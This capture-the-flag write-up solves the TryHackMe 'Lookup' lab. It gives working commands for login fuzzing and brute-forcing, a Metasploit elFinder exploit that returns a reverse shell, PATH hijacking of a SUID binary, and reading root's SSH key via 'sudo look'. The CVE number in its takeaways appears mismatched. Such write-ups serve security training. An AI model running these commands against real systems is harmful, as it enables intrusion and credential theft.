# 🛡️ TryHackMe – Lookup - Writeup

## 📌 Overview
**Room Name:** Lookup  
**Platform:** TryHackMe  
**Difficulty:** easy  

The Lookup machine features an attack chain that starts with web-based username enumeration leveraging differential login error messages. This is followed by a password brute-force attack to gain access to an internal sub-domain hosting a vulnerable version of elFinder. Exploiting this yields a reverse shell. Privilege escalation involves analyzing a custom SUID binary (`pwm`) to perform PATH hijacking, extracting SSH passwords for lateral movement to the `think` user. Finally, a misconfigured `sudo` permission on the `look` utility is abused to read the root SSH private key and achieve full system compromise.

---

## 🔍 1. Enumeration

### 🔎 Port Scanning
An initial port scan revealed the following open ports:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Since SSH typically requires credentials or a key, the primary focus for initial access was the HTTP service. 
Accessing `http://lookup.thm` required adding the domain to the local `/etc/hosts` file:

```bash
echo "10.49.154.238 lookup.thm" | sudo tee -a /etc/hosts
```

### 🕵️ Web Enumeration & Username Discovery
Navigating to `lookup.thm` presented a login page. Testing the login form with dummy credentials (e.g., `admin` / `test`) returned an interesting error message:

> "Wrong password"

This discrepancy is a classic sign of **Username Enumeration**. If a username does not exist, secure applications typically return a generic message like "Invalid username or password". The specific "Wrong password" response indicated that the username was valid, but the password was incorrect. 

Using `ffuf` and a standard wordlist (`namelist.txt` from Metasploit), I fuzzed the username field to find valid accounts by filtering out the default failure response size:

```bash
ffuf -u http://lookup.thm/login.php \
-X POST \
-d "username=FUZZ&password=test" \
-H "Content-Type: application/x-www-form-urlencoded" \
-w /usr/share/metasploit-framework/data/wordlists/namelist.txt 
```

**Result:** Found a valid username: `jose`

---

## 🔓 2. Initial Access

### 🔐 Password Bruteforce
Knowing a valid username, I used `hydra` to brute-force the HTTP POST login form with the `rockyou.txt` wordlist.

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" -t 64 -V
```

**Credentials Discovered:**
```text
Username: jose
Password: password123
```

### 📂 Vulnerable Web App (elFinder)
Logging in with these credentials redirected to a new subdomain: `files.lookup.thm`. I added this to my `/etc/hosts` file as well:

```bash
echo "10.49.154.238 files.lookup.thm" | sudo tee -a /etc/hosts
```

The application running at this subdomain was **elFinder 2.1.47**, a web-based file manager.
Using `searchsploit`, I checked for known vulnerabilities associated with this version:

```bash
searchsploit elfinder
```

The results highlighted a highly relevant exploit:
`elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection`

### 💥 Remote Code Execution
To exploit this, I utilized the corresponding Metasploit module:

```bash
msfconsole
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set RHOSTS files.lookup.thm
set TARGETURI /elFinder/
set LHOST tun0
run
```

The exploit successfully executed a payload, granting a reverse shell as the `www-data` user. To stabilize the shell, I spawned a TTY using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🚀 3. Lateral Movement: www-data → think

### 🔍 SUID Binary Analysis
During local enumeration, I searched for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the standard binaries, one stood out as highly unusual: `/usr/sbin/pwm`.
I also noticed a user named `think` in the `/home` directory.

To understand what `pwm` does, I ran `strings` against the binary:

```bash
strings /usr/sbin/pwm
```

Key output snippets:
```text
[!] Running 'id' command to extract the username and user ID (UID)
uid=%*u(%[^)])
[!] ID: %s
/home/%s/.passwords
[-] File /home/%s/.passwords not found
```

This indicated the binary does the following:
1. Executes the `id` command.
2. Parses the output to determine the current username.
3. Reads and displays the contents of `/home/<username>/.passwords`.

### 🛠️ PATH Hijacking
Because the binary calls `id` directly instead of using its absolute path (`/usr/bin/id`), it is vulnerable to **PATH Hijacking**. By controlling the `PATH` environment variable, I could force the SUID binary to execute a malicious `id` script and trick it into reading another user's `.passwords` file.

I crafted a fake `id` script in `/tmp` that returned the identity of the user `think`:

```bash
echo -e '#!/bin/bash\necho "uid=1000(think) gid=1000(think) groups=1000(think)"' > /tmp/id
chmod +x /tmp/id
```

Then, I executed the SUID binary while prepending `/tmp` to the `PATH`:

```bash
PATH=/tmp:$PATH /usr/sbin/pwm
```

The binary executed my fake script, believed the current user was `think`, and outputted the contents of `/home/think/.passwords`:

```text
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
...
osemario.AKA(think) 
...
```

### 🔑 SSH Bruteforce
I saved these password candidates into a file (`think.txt`) and used `hydra` to perform a targeted brute-force attack against SSH for the user `think`.

```bash
hydra -l think -P think.txt ssh://10.49.154.238
```

**Credentials Found:**
```text
Username: think
Password: osemario.AKA(think)
```

I successfully logged in via SSH and retrieved `user.txt`.

---

## 👑 4. Privilege Escalation: think → root

### ⚠️ Sudo Misconfiguration
Checking the `sudo` privileges for the user `think`:

```bash
sudo -l
```

Output:
```text
User think may run the following commands on ip-10-48-128-245:
    (ALL) /usr/bin/look
```

The `look` utility displays lines beginning with a given string. According to GTFOBins, it can be abused to read arbitrary files by providing an empty string as the search parameter.

### 🔓 Extracting the Root SSH Key
I leveraged this misconfiguration to read the root user's SSH private key:

```bash
sudo look "" /root/.ssh/id_rsa
```

This printed the entire RSA private key to the console:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

I copied the key to my local attacking machine, saved it as `id_rsa`, and set the appropriate permissions:

```bash
chmod 600 id_rsa
```

Finally, I authenticated as `root` via SSH:

```bash
ssh -i id_rsa root@10.49.154.238
```

**ROOT ACCESS GRANTED.** I was then able to read the final `root.txt` flag.

---

## 📚 Key Takeaways

- 🚨 **Improper Error Handling:** The login page returning a specific "Wrong password" error instead of a generic "Invalid credentials" message enabled easy username enumeration.
- 🔓 **Outdated Software:** Running vulnerable, outdated versions of third-party plugins like elFinder (CVE-2021-32682 / Command Injection) provides a direct vector for remote code execution.
- 🛠️ **Relative Paths in SUID Binaries:** Using relative paths (like calling `id` instead of `/usr/bin/id`) inside an SUID binary opens the door for PATH Injection/Hijacking, allowing privilege escalation and lateral movement.
- 🔑 **Sudo Misconfigurations:** Allowing users to run utilities like `look` as root without restrictions can inadvertently grant arbitrary file read access, leading to a full system compromise.

---

## 📚 Credit 
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only